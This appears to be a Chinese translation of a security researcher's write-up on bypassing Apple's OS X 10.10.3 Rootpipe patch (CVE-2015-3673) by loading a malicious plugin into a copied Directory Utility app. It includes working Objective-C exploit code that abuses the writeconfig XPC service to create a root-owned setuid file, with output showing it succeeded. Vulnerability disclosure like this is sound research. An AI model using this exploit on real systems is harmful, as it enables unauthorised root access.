再次利用Rootpipe漏洞

再次利用Rootpipe漏洞

这次公布的漏洞是在我发现的Apple OS X权限提升漏洞Rootpipe基础上发现的。在这里可以看到我完全公布Rootpipe漏洞的一些背景信息。

背景知识

非常感谢Patrick Wardle启发了我，他发现在OS X 10.10.3系统打补丁后，依然可以再次利用Rootpipe，这促使我开始了进一步的探索。当苹果昨天发布OS X10.10.4系统的细节后，我们俩同时向苹果提交了这个问题，名为CVE-2015-3673。

苹果修复10.10.3的方案是：所有二进制文件访问Rootpipe使用的writeconfig XPC 服务时，需要特殊权限“com.apple.private.admin.writeconfig”。

苹果没有在XPC服务接口上有太大的变化。这意味着Rootpipe的方式，依然有可以有写入到任意路径/文件的权限。我公布Rootpipe细节后不久（此时OS X 10.10.3已被发布），Patrick Wardle在他的博客中写到，它发现一种在打补丁后，再次利用Rootpipe的方式。这使我好奇，开始进一步的探索。

分析

这种授权检查是比较有限的，我想每个人都同意了（即使是苹果？）。XPC服务所使用了OS X很多不同的部分。实际上有45个二进制文件在我10.10.3系统中，他们拥有这种权限！如果我可以让任何一个执行Rootpipe攻击代码，那么苹果的修复可能被绕过。但我不能修改现有的二进制文件，因为这会破坏代码签名。

我不能把权限分配给自己的程序，因为系统只接受苹果签署的二进制文件。在不是Root用户的情况下，我不能注入新的线程到一个已经存在的进程中。这给我留下的只有一个选择：我能否做一个有权限的二进制库，载入我的攻击代码？

事实证明，我可以。请继续阅读！

注意列表中的/ usr / sbin/ systemsetup，这部分导致了Rootpipe的最初发现。我在Hopper中浏览了目录中的一部分，停在了“Directory Utility”。

在Hopper中载入他们，发现了下面的方法（当Directory Utility被启动时，这个方法被调用）。

void -[PluginController loadPlugins](void * self, void * _cmd) {
    r14 = *objc_msgSend;
    [self loadPluginsInDirectory:[[NSBundle mainBundle] builtInPlugInsPath]];
    rax = [self loadPluginsInDirectory:@"/Library/Application Support/Directory Utility/PlugIns/"];
    return;
}

原来，目录Directory Utility会从两个不同的路径，一个是在 /Library ，另一个是“Directory Utility”包内读取插件二进制文件（如包）。我需要root 权限才能在这些位置写入。但是，如果我复制整个Directory Utility包到tmp目录，我会有写权限，而代码签名和分配的配额将保持不变。

运行rootpipe攻击代码

下面是我的简单的攻击代码。我将这段程序编译成一个包。包名称必须以.daplug后缀放在plugins目录中。

#include <dlfcn.h>
#include <objc/objc.h>
#include <objc/runtime.h>
#include <objc/message.h>
#include <Foundation/Foundation.h>
 
#define PRIV_FWK_BASE "/System/Library/PrivateFrameworks"
#define FWK_BASE "/System/Library/Frameworks"
 
void __attribute__ ((constructor)) test(void)
{
    void* p = dlopen(PRIV_FWK_BASE "/SystemAdministration.framework/SystemAdministration", RTLD_NOW);
 
    if (p != NULL)
    {
        id sharedClient = objc_msgSend(objc_lookUpClass("WriteConfigClient"), @selector(sharedClient));
        objc_msgSend(sharedClient, @selector(authenticateUsingAuthorizationSync:), nil);
        id tool = objc_msgSend(sharedClient, @selector(remoteProxy));
 
        NSData* data = [NSData dataWithContentsOfFile:@"/tmp/source"];
         
        objc_msgSend(tool, @selector(createFileWithContents:path:attributes:),
                     data,
                     @"/tmp/target",
                     @{ NSFilePosixPermissions : @04777 });
    }
}

在tmp目录中运行“Directory Utility”文件，将立即载入RootpipeBundle并执行攻击代码。该攻击代码会复制一个文件从 /tmp/source，到 /tmp/target。新的文件将具有Root权限作为所有者和setuid bit set。

$ ls -l /tmp/
total 0
drwxr-xr-x  3 emil  wheel  102 Jun 30 23:59 Directory Utility.app
-rw-r--r--  1 emil  wheel    1 Jul  1 00:04 source
-rwsrwxrwx  1 root  wheel    1 Jul  1 00:11 target

总结

这次苹果为10.10.3的Rootpipe漏洞做出的修复依然是有漏洞的。系统（包括Guest帐户）的任何用户仍然可以利用相同的XPC服务功能升级到Root权根。

还是有很多的有权向XPC服务进行通信的二进制文件。我还没有时间来搜索所有这些额外的文件来执行代码。苹果对OS X10.10.4做了更多的变化，比如限制二进制文件会被执行的目录的权限。这意味着，复制一个有可执行权限的二进制文件到tmp目录将不再起作用。
